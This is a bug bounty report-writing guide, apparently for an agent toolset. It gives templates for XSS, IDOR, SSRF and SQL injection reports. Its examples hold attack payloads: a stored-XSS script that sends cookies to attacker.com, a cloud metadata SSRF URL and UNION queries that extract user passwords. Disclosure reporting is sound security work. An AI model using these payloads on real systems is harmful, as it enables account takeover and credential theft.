# bb-report-templates — Report Templates & Writing Guide

Ready-to-use report templates for the most common vulnerability types.
Copy, fill in the blanks, and submit.

> Referenced by: `bb-orchestrator.md`, `bb-operator.md`
> Mentions: `bb-eligible-vulnerabilities.md` (for severity/CWE), `bb-standards.md` (for platform rules)

---

## Report Preparation Checklist

Before using any template below, run this prep workflow:

1. **`bb_generate_report_context(finding_id)`** — pull the report-ready pack:
   normalized summary, linked hypothesis data, evidence records, attachments,
   notes, and unresolved gaps (missing CWE, CVSS, PoC, evidence).
2. **Fill the gaps** — use `bb_update_finding()` to add any missing fields
   identified by the report context.
3. **Attach remaining evidence** — use `bb_upload_attachment()` for screenshots
   or recordings, `bb_attach_http_pair()` for HTTP evidence.
4. **Select the matching template** below by vulnerability type.
5. Fill the template from the report context data.
6. **Self-review**: is impact clear? are steps reproducible? is every claim
   backed by evidence?

---

## Report Writing Principles

1. **Lead with impact** — the first sentence should tell the triage team what an attacker can do, not what the vulnerability is
2. **Steps must be atomic** — each step is a single action, numbered, nothing left to imagination
3. **Attach evidence for every step** — screenshots and/or HTTP requests/responses
4. **One vulnerability per report** — don't bundle multiple issues
5. **Avoid jargon** — write as if explaining to a senior developer, not a security researcher

---

## Universal Report Structure

```markdown
## Summary
One paragraph. What is the vulnerability? What can an attacker do?
What is the impact on the application and its users?

## Vulnerability Details
- **Type**: [XSS / SQLi / IDOR / SSRF / …]
- **CWE**: [CWE-XX]
- **CVSS Score**: [X.X]
- **Affected Endpoint**: [URL or component]
- **Parameter**: [vulnerable parameter name]

## Steps to Reproduce
1. Log in as a normal user at https://example.com/login
2. Navigate to https://example.com/profile
3. [Exact action]
4. Observe [exact result]

## Proof of Concept
[Code, payload, or curl command]

## Impact
[Specific, concrete impact. What data is exposed? What actions can be performed?
Who is affected? What is the worst-case scenario?]

## Remediation
[Suggested fix — concrete, actionable]
```

---

## Template: Reflected XSS

```markdown
## Summary
An attacker can execute arbitrary JavaScript in the browser of any user who clicks
a crafted link to `[ENDPOINT]`. This enables session hijacking, credential theft,
or account takeover via cookie exfiltration.

## Vulnerability Details
- **Type**: Reflected Cross-Site Scripting (XSS)
- **CWE**: CWE-79
- **CVSS Score**: 6.1 (Medium)
- **Affected Endpoint**: `GET [FULL URL WITH PAYLOAD]`
- **Parameter**: `[PARAM NAME]`

## Steps to Reproduce
1. Open a browser and navigate to the following URL:
   `https://example.com/search?q=<script>alert(document.domain)</script>`
2. Observe that the JavaScript executes and an alert dialog appears showing the domain.

## Proof of Concept
URL:
```
https://example.com/search?q=<img src=x onerror=alert(document.cookie)>
```

## Impact
An attacker can craft a link with an arbitrary JavaScript payload and distribute
it via email or social media. Any authenticated user who clicks the link will have
their session cookie sent to the attacker, enabling full account takeover.

## Remediation
Encode all user-supplied input before rendering it in HTML context using an
HTML entity encoder. For [framework], use [specific function/method].
```

---

## Template: Stored XSS

```markdown
## Summary
User-supplied input in the `[FIELD]` field is stored and rendered without
sanitization to all users who view `[PAGE]`. An attacker with a standard account
can permanently inject JavaScript that executes in the context of any user,
including administrators.

## Vulnerability Details
- **Type**: Stored Cross-Site Scripting (XSS)
- **CWE**: CWE-79
- **CVSS Score**: 8.0 (High)
- **Affected Endpoint**: `POST [ENDPOINT]`
- **Parameter**: `[PARAM]`

## Steps to Reproduce
1. Log in as Account A (attacker) at `https://example.com/login`
2. Navigate to `[PAGE WITH VULNERABLE FIELD]`
3. In the `[FIELD]` field, enter: `<script>fetch('https://attacker.com?c='+document.cookie)</script>`
4. Save the form.
5. Log in as Account B (victim) in a separate browser.
6. Navigate to `[PAGE THAT RENDERS THE FIELD]`.
7. Observe that Account B's cookies are sent to `attacker.com`.

## Proof of Concept
[Screenshot of payload stored]
[Screenshot of execution in victim's session]
[Server log from attacker.com showing received cookie]

## Impact
Any authenticated user, including administrators, who views `[PAGE]` will have
their session cookie exfiltrated to an attacker-controlled server, enabling
full account takeover without any interaction beyond normal browsing.

## Remediation
Sanitize stored user input using a context-aware HTML sanitization library
(e.g. DOMPurify for client-side, bleach for Python server-side).
```

---

## Template: IDOR

```markdown
## Summary
The API endpoint `[ENDPOINT]` does not verify that the authenticated user owns
the requested resource. By modifying the `[PARAMETER]` value, an attacker can
access or modify any [resource type] belonging to any other user.

## Vulnerability Details
- **Type**: Insecure Direct Object Reference (IDOR)
- **CWE**: CWE-639
- **CVSS Score**: 7.5 (High)
- **Affected Endpoint**: `[METHOD] [ENDPOINT]`
- **Parameter**: `[PARAM]`

## Steps to Reproduce
1. Create two accounts: Account A (attacker, ID: `[ID_A]`) and Account B (victim, ID: `[ID_B]`).
2. Log in as Account A.
3. Send the following request:
   ```
   GET /api/user/[ID_B]/profile
   Authorization: Bearer [ACCOUNT_A_TOKEN]
   ```
4. Observe that the response returns Account B's private profile data.

## Proof of Concept
Request:
```
[FULL HTTP REQUEST]
```
Response:
```
[FULL HTTP RESPONSE WITH VICTIM DATA]
```

## Impact
Any authenticated user can read (and potentially modify) the private data of
any other user by enumerating IDs. Exposed data includes: [specific fields].
With [X] registered users, all accounts are affected.

## Remediation
Implement server-side authorization checks that verify the authenticated user
owns the requested resource before returning data. Never rely on the client
to enforce access control.
```

---

## Template: SSRF

```markdown
## Summary
The `[PARAMETER]` parameter on `[ENDPOINT]` allows an attacker to make the
server issue HTTP requests to arbitrary internal or external URLs. This enables
enumeration of internal services and, in cloud environments, access to instance
metadata containing credentials.

## Vulnerability Details
- **Type**: Server-Side Request Forgery (SSRF)
- **CWE**: CWE-918
- **CVSS Score**: 8.6 (High)
- **Affected Endpoint**: `[METHOD] [ENDPOINT]`
- **Parameter**: `[PARAM]`

## Steps to Reproduce
1. Set up an out-of-band interaction server (Burp Collaborator or interactsh).
2. Send the following request:
   ```
   POST /api/fetch
   Content-Type: application/json

   {"url": "https://[YOUR_COLLABORATOR_PAYLOAD]"}
   ```
3. Observe a DNS lookup and HTTP request received at the collaborator server.
4. To demonstrate internal access, use: `{"url": "http://169.254.169.254/latest/meta-data/"}`
5. Observe cloud instance metadata returned in the response.

## Proof of Concept
[Screenshot of collaborator showing DNS/HTTP callback]
[Screenshot of metadata response if applicable]

## Impact
An attacker can enumerate internal services not exposed to the internet.
In cloud environments (AWS/GCP/Azure), this can expose instance metadata
including IAM credentials, enabling lateral movement and full cloud account compromise.

## Remediation
Validate and whitelist allowed URL schemes and hosts. Block requests to
private IP ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16).
Use a DNS resolution check to prevent SSRF via DNS rebinding.
```

---

## Template: SQL Injection

```markdown
## Summary
The `[PARAMETER]` parameter is vulnerable to SQL injection, allowing an attacker
to read arbitrary data from the database, including [sensitive data types].

## Vulnerability Details
- **Type**: SQL Injection
- **CWE**: CWE-89
- **CVSS Score**: 9.8 (Critical)
- **Affected Endpoint**: `[METHOD] [ENDPOINT]`
- **Parameter**: `[PARAM]`
- **Database**: [MySQL / PostgreSQL / MSSQL / SQLite]

## Steps to Reproduce
1. Send the following request:
   ```
   GET /products?id=1'
   ```
2. Observe a database error in the response, confirming SQL injection.
3. Extract database version:
   ```
   GET /products?id=1 UNION SELECT @@version--
   ```
4. Extract user table:
   ```
   GET /products?id=1 UNION SELECT username,password FROM users--
   ```

## Proof of Concept
```
[FULL SQLMAP COMMAND OR MANUAL PAYLOAD]
[OUTPUT SHOWING DATA EXTRACTED]
```

## Impact
An attacker can read all data from the database, including usernames, password hashes,
and [other sensitive data]. With write access, an attacker could modify or delete data,
or in some configurations, execute OS commands via `xp_cmdshell` or `INTO OUTFILE`.

## Remediation
Use parameterized queries / prepared statements. Never concatenate user input
into SQL strings. Use an ORM if possible. Implement input validation as a
secondary defense.
```
